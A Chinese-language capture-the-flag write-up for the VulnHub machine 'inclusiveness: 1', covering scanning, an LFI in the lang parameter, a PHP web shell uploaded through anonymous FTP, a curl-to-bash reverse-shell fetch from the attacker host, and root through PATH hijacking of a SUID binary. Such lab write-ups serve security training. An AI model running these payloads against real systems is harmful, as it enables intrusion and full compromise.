# inclusiveness: 1

2024-5-20 https://www.vulnhub.com/entry/inclusiveness-1,422/

difficulty: Easy

## IP

192.168.5.20

## Scan

Open Port -> 21,22,80

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Feb 08  2020 pub [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.5.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 061ba39283a57a15bd406e0c8d98277b (RSA)
|   256 cb3883261a9fd35dd3fe9ba1d3bcab2c (ECDSA)
|_  256 6554fc2d12ace184783e0023fbe4c9ee (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
```

21 ftp 可以匿名登陆，看看有什么内容。

只有一个 pub 文件夹，其中什么内容都没有。但是有可能是后门 web 中的一个目录，或许到时候能上传 web shell，先放在这里。

看 80 的 web 服务上有什么信息，首页是 apache 默认页面，要使用 gobuster 进行目录扫描：

```
http://192.168.5.20/index.html           (Status: 200) [Size: 10701]
http://192.168.5.20/manual               (Status: 301) [Size: 313] [--> http://192.168.5.20/manual/]
http://192.168.5.20/javascript           (Status: 301) [Size: 317] [--> http://192.168.5.20/javascript/]
http://192.168.5.20/robots.txt           (Status: 200) [Size: 59]
http://192.168.5.20/seo.html             (Status: 200) [Size: 59]
http://192.168.5.20/norobots.txt         (Status: 200) [Size: 59]
http://192.168.5.20/robots-txt.php       (Status: 200) [Size: 59]
http://192.168.5.20/robots-txt.txt       (Status: 200) [Size: 59]
http://192.168.5.20/robots-txt.html      (Status: 200) [Size: 59]
http://192.168.5.20/robots-txt           (Status: 200) [Size: 59]
http://192.168.5.20/valid-robots.txt     (Status: 200) [Size: 59]
```

一堆 robots 连接，访问其中一个，返回内容；You are not a search engine! You can't read my robots.txt!，估计要把 UA 修改成 spider 后才能获得其中内容。

尝试把 UA 设置成 google 的爬虫，再次进行访问：

```
curl -A 'Googlebot' http://192.168.5.20/robots.txt
User-agent: *
Disallow: /secret_information/
```

得到了一个隐藏目录 /secret_information/， 访问看看有什么内容。显示了一个 DNS 传送攻击的解释，源代码中也没什么隐藏信息，继续使用 gobuster 进行扫描。还是得到了一堆 robots：

```
http://192.168.5.20/secret_information/.php                 (Status: 403) [Size: 277]
http://192.168.5.20/secret_information/index.php            (Status: 200) [Size: 1477]
http://192.168.5.20/secret_information/en.php               (Status: 200) [Size: 1331]
http://192.168.5.20/secret_information/es.php               (Status: 200) [Size: 1499]
http://192.168.5.20/secret_information/robots.txt           (Status: 200) [Size: 59]
http://192.168.5.20/secret_information/.php                 (Status: 403) [Size: 277]
http://192.168.5.20/secret_information/.html                (Status: 403) [Size: 277]
http://192.168.5.20/secret_information/norobots.txt         (Status: 200) [Size: 59]
http://192.168.5.20/secret_information/robots-txt.php       (Status: 200) [Size: 59]
http://192.168.5.20/secret_information/robots-txt.html      (Status: 200) [Size: 59]
http://192.168.5.20/secret_information/robots-txt.txt       (Status: 200) [Size: 59]
http://192.168.5.20/secret_information/robots-txt           (Status: 200) [Size: 59]
http://192.168.5.20/secret_information/valid-robots.txt     (Status: 200) [Size: 59]
```

继续修改 UA 头，进行访问：

```
curl -A 'Googlebot' http://192.168.5.20/secret_information/norobots.txt
```

都是返回 404，这里估计不是攻击方向。

在仔细看这个页面上有两个翻译的连接， http://192.168.5.20/secret_information/index.php?lang=en.php 最后的这个 lang 参数很有可能存在本地文件包含漏洞。

进行 LFI 测试：

```
curl http://192.168.5.20/secret_information/index.php?lang=/etc/passwd

root:x:0:0:root:/root:/bin/bash
...
tom:x:1000:1000:Tom,,,:/home/tom:/bin/bash
```

证明存在 LFI 漏洞，下面就是要找到能够进行文件包含的文件，让后写入后门 php 执行代码。

```
ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://192.168.5.20/secret_information/index.php?lang=FUZZ -fs 146
```

其中发现了 /etc/vsftpd.conf 这个配置配置文件，通过 LFI 读取了其中的配置信息：

```
anon_root=/var/ftp/
write_enable=YES
```

说明上传到 Ftp 中的文件，保存在 /var/ftp/ 目录中，这时，我们上传一个 shell.php 脚本，到 ftp 的 pub 目录中，内容如下：

```
<?php system($_GET[1]);?>
```

这时，在通过 curl 进行 LFI 访问：

```
curl 'http://192.168.5.20/secret_information/index.php?lang=/var/ftp/pub/shell.php&1=pwd'
```

得到了我们想要的内容：

```
<title>zone transfer</title>
<h2>DNS Zone Transfer Attack</h2>
<p><a href='?lang=en.php'>english</a> <a href='?lang=es.php'>spanish</a></p>

/var/www/html/secret_information
```

这时就能把我们的反弹命令写入带入执行：

```
curl -G --data-urlencode 'lang=/var/ftp/pub/shell.php' --data-urlencode '1=curl http://192.168.5.3/5.3/8888.sh|bash' http://192.168.5.20/secret_information/index.php
```

kali 上监听 8888 端口，执行上面代码后，得到了反弹的 shell，升级 tty：

```
www-data@inclusiveness:/var/www/html/secret_information$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

开始系统枚举，寻找攻击路径。sudo、cap、suid 等方向都没有发现特殊的程序。

在/home/tom 中，发现 2 个有意思的文件：

```
-rwsr-xr-x  1 root root 16976 Feb  8  2020 rootshell
-rw-r--r--  1 tom  tom    448 Feb  8  2020 rootshell.c
```

先看看 rootshell.c 的内容：

```
int main() {

    printf("checking if you are tom...\n");
    FILE* f = popen("whoami", "r");

    char user[80];
    fgets(user, 80, f);

    printf("you are: %s\n", user);
    //printf("your euid is: %i\n", geteuid());

    if (strncmp(user, "tom", 3) == 0) {
        printf("access granted.\n");
	    setuid(geteuid());
        execlp("sh", "sh", (char *) 0);
    }
}
```

whoami 检测出我们不是 tom，程序就退出了。

发现其中的 whoami 程序调用时没有使用绝对路径，我们可以在/tmp 中创建 whoami 文件，执行时返回 tom，设置 PATH 取代系统的 whoami 执行。

```
www-data@inclusiveness:/home/tom$ cd /tmp
www-data@inclusiveness:/tmp$ echo 'echo tom' > whoami
www-data@inclusiveness:/tmp$ cat whoami
echo tom
www-data@inclusiveness:/tmp$ export PATH=/tmp:$PATH
www-data@inclusiveness:/tmp$ chmod +x whoami
www-data@inclusiveness:/tmp$ /home/tom/rootshell
# id
uid=0(root) gid=33(www-data) groups=33(www-data)
# cd /root
# ls
flag.txt
# cat flag.txt
|\---------------\
||                |
|| UQ Cyber Squad |
||                |
|\~~~~~~~~~~~~~~~\
|
|
|
|
o

flag{omg_you_did_it_YAY}
```
